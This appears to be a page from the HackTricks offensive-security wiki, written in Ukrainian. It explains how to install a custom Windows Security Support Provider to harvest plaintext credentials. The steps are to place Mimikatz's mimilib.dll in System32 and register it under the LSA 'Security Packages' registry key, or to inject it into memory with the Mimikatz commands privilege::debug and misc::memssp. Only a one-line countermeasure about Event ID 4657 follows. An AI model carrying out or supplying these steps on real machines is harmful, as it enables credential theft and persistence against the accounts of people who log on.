# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Дізнайтеся, що таке SSP (Security Support Provider), тут.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити **власний SSP**, щоб **перехоплювати** у **відкритому тексті** **облікові дані**, які використовуються для доступу до машини.

#### Mimilib

Ви можете використати бінарний файл `mimilib.dll`, наданий Mimikatz. **Цей файл записуватиме всі облікові дані у відкритому тексті у файл.**\
Помістіть DLL у `C:\Windows\System32\`\
Отримайте список наявних пакетів безпеки LSA:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Додайте `mimilib.dll` до списку Security Support Provider (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
І після перезавантаження всі облікові дані можна знайти у відкритому тексті в `C:\Windows\System32\kiwissp.log`

#### У пам'яті

Ви також можете безпосередньо інжектити це в пам'ять за допомогою Mimikatz (зверніть увагу, що це може бути дещо нестабільним/не працювати):
```bash
privilege::debug
misc::memssp
```
Це не збережеться після перезавантаження.

#### Заходи протидії

Event ID 4657 — аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
